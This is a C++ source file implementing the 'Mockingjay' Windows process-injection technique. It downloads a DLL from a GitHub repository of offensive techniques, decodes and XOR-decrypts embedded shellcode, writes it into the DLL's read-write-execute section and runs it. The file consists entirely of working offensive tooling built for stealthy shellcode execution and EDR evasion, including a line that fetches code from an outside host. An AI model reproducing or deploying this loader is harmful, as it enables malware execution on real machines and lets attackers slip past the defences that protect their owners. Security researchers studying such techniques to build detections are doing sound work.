#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <cstdint>
#include <vector>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "urlmon.lib")

#define VulnDLLPath L"ver.dll"

// b64_shellcode and XOR_KEY are defined in "shellcode_encoded.h"
#include "shellcode_encoded.h"

// Decode Base64 string into a std::vector<uint8_t>
std::vector<uint8_t> Base64Decode(const char* input) {
    DWORD len = 0;

    // First call to get required length
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, nullptr, &len, nullptr, nullptr)) {
        printf("[-] CryptStringToBinaryA (len) failed. Error: %lu\n", GetLastError());
        return {};
    }

    std::vector<uint8_t> output(len);

    // Second call to actually decode
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, output.data(), &len, nullptr, nullptr)) {
        printf("[-] CryptStringToBinaryA (decode) failed. Error: %lu\n", GetLastError());
        return {};
    }

    return output;
}

// Simple XOR decryption
void DecryptShellcode(std::vector<uint8_t>& data, uint8_t key) {
    for (auto& byte : data) {
        byte ^= key;
    }
}

PIMAGE_NT_HEADERS ImageNtHeader(HMODULE hModule) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    return (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
}

DWORD_PTR FindRWXOffset(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && 
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && 
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                printf("[i] DLL base address: 0x%p\n", baseAddress);
                printf("\t[i] RWX section offset: 0x%p\n", sectionOffset);
                return sectionOffset;
            }
            sectionHeader++;
        }
    }
    return 0;
}

DWORD_PTR FindRWXSize(HMODULE hModule) {
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL) {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) && 
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) && 
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ)) {
                DWORD_PTR sectionSize = sectionHeader->SizeOfRawData;
                printf("\t[i] RWX section size: %d bytes\n", sectionSize);
                return sectionSize;
            }
            sectionHeader++;
        }
    }
    return 0;
}

void WriteCodeToSection(LPVOID rwxSectionAddr, unsigned char* shellcode, SIZE_T sizeShellcode) {
    memcpy((LPVOID)rwxSectionAddr, shellcode, sizeShellcode);
    printf("[i] %d bytes of shellcode written to RWX memory region\n", sizeShellcode);
}

void ExecuteCodeFromSection(LPVOID rwxSectionAddr) {
    printf("[i] Calling the RWX region address to execute the shellcode\n");
    ((void(*)())rwxSectionAddr)();
}

int main()
{
    HRESULT hr = URLDownloadToFileA(NULL, "https://raw.githubusercontent.com/Offensive-Panda/ProcessInjectionTechniques/refs/heads/main/Mokingjay/Mokingjay/ver.dll", "ver.dll", 0, NULL);
    Sleep(1500);

    // Decode and decrypt shellcode from shellcode_encoded.h
    auto decoded = Base64Decode(b64_shellcode);
    if (decoded.empty()) {
        printf("[-] Failed to decode base64 shellcode\n");
        return 1;
    }

    printf("[i] Base64 decoded successfully: %zu bytes\n", decoded.size());
    DecryptShellcode(decoded, static_cast<uint8_t>(XOR_KEY));
    printf("[i] Shellcode decrypted with XOR key\n");

    // Load the vulnerable DLL
    HMODULE hDll = LoadLibraryW(VulnDLLPath);

    if (hDll == NULL) {
        printf("[-] Failed to load the targeted DLL. Error: %lu\n", GetLastError());
        return -1;
    }

    DWORD_PTR RWX_SECTION_OFFSET = FindRWXOffset(hDll);
    DWORD_PTR RWX_SECTION_SIZE = FindRWXSize(hDll);

    if (RWX_SECTION_OFFSET == 0) {
        printf("[-] No RWX section found in DLL\n");
        FreeLibrary(hDll);
        return -1;
    }

    // Access the RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)hDll + RWX_SECTION_OFFSET);

    printf("[i] RWX section starts at 0x%p and ends at 0x%p\n", rwxSectionAddr, (PBYTE)rwxSectionAddr + RWX_SECTION_SIZE);

    SIZE_T shellcodesize = decoded.size();

    // Ensure shellcode fits in RWX section
    if (shellcodesize > RWX_SECTION_SIZE) {
        printf("[-] Shellcode too large for RWX section (%zu > %lu bytes)\n", shellcodesize, RWX_SECTION_SIZE);
        FreeLibrary(hDll);
        return -1;
    }

    // Write the injected code to the RWX section
    WriteCodeToSection(rwxSectionAddr, decoded.data(), shellcodesize);

    // Execute the injected code
    ExecuteCodeFromSection(rwxSectionAddr);

    FreeLibrary(hDll);
    return 0;
}